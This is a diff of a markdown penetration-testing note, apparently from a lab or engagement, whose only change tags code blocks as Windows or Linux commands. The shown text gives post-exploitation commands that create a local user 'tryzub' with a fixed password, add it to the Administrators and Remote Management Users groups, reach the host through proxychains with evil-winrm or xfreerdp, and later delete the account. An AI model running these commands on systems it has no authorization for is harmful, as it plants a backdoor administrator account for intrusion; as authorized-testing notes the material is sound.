@@ -13,12 +13,14 @@ When command execution lands with local administrator rights, create a temporary
 
 Create a local user:
 
+<!-- cmd: windows -->
 ```cmd
 net user tryzub Tryzub@ /add
 ```
 
 Add the account to administrator and WinRM groups:
 
+<!-- cmd: windows -->
 ```cmd
 net localgroup Administrators tryzub /add
 net localgroup "Remote Management Users" tryzub /add
@@ -27,12 +29,14 @@ net user tryzub
 
 Connect over WinRM:
 
+<!-- cmd: linux -->
 ```bash
 proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
 ```
 
 Or use RDP with a shared tooling directory:
 
+<!-- cmd: linux -->
 ```bash
 proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' \
   +clipboard /dynamic-resolution \
@@ -43,6 +47,7 @@ proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' \
 
 ## Cleanup
 
+<!-- cmd: windows -->
 ```cmd
 net user tryzub /delete
 ```
